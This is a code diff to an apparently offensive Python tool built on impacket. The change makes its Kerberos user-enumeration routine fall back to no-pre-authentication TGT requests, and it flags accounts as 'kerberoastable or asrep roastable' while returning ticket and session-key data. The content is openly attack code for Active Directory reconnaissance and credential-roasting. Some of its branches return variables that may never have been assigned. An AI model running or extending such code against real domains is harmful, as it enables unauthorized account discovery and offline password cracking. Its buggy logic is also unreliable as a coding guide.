@@ -11,13 +11,16 @@ from impacket.krb5.asn1 import TGS_REP, AS_REP
 from impacket.krb5.ccache import CCache
 from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS, SessionError
 from impacket.krb5.types import Principal
+
 try:
+    from utils.kerb5getuserspnnopreauth import getKerberosTGT as nopreauthTGT
     from utils.adconn import LdapConn
     from utils.tickets import TGT, TGS
 except:
     sys.path.insert(0, './utils')
     from adconn import LdapConn
     from tickets import TGT, TGS
+    from kerb5getuserspnnopreauth import getKerberosTGT as nopreauthTGT
 
 
 def build_queue(file) -> Queue:
@@ -33,21 +36,35 @@ def enumerate_user(user, domain, dc):
     dc_ip = socket.gethostbyname(dc)
     userclient = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
     try:
-        tgt, cipher, oldSessioKey, sessionKey =getKerberosTGT(userclient,domain=domain,kdcHost=dc_ip, password='',
+        try:
+            tgt, cipher, oldSessioKey, sessionKey = getKerberosTGT(userclient,domain=domain,kdcHost=dc_ip, password='',
                            lmhash='', nthash='')
-    except SessionError as e:
-        code = e.getErrorCode()
-        if code != 6:
-            print(f'[+] Found user: {user}@{domain}')
+        except SessionError as e:
+            code = e.getErrorCode()
+            if code != 6:
+                print(f'[+] Found user: {user}@{domain}')
+                return {'user':user, 'tgt':tgt, 'cipher':cipher, 'oldSessionKey': oldSessioKey, 'sessionKey': sessionKey}
+            else:
+                return None
+        except Exception as e:
+            #print(e)
+            print(f'[+] possible kerberoastable or asrep raostable user: {user}@{domain}')
             return {'user':user, 'tgt':tgt, 'cipher':cipher, 'oldSessionKey': oldSessioKey, 'sessionKey': sessionKey}
-        else:
-            return None
-    except Exception as e:
-        #print(e)
-        print(f'[+] possible kerberoastable or asrep raostable user: {user}@{domain}')
-        return {'user':user, 'tgt':tgt, 'cipher':cipher, 'oldSessionKey': oldSessioKey, 'sessionKey': sessionKey}
-        
-
+    except:
+        try:
+            tgt, cipher, oldSessioKey, sessionKey = nopreauthTGT(userclient,domain=domain,kdcHost=dc_ip, password='',
+                           lmhash='', nthash='', kerberoast_no_preauth=True)
+        except SessionError as e:
+            code = e.getErrorCode()
+            if code != 6:
+                print(f'[+] Found user: {user}@{domain}')
+                return {'user':user, 'tgt':tgt, 'cipher':cipher, 'oldSessionKey': oldSessioKey, 'sessionKey': sessionKey}
+            else:
+                return None
+        except Exception as e:
+            #print(e)
+            print(f'[+] possible kerberoastable or asrep raostable user: {user}@{domain}')
+            return {'user':user, 'tgt':tgt, 'cipher':cipher, 'oldSessionKey': oldSessioKey, 'sessionKey': sessionKey}
         # userclient = Principal(self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
         # try:
         #     tgt, cipher, oldSessionKey, newSessionKey = getKerberosTGT(userclient, password=self.password, 
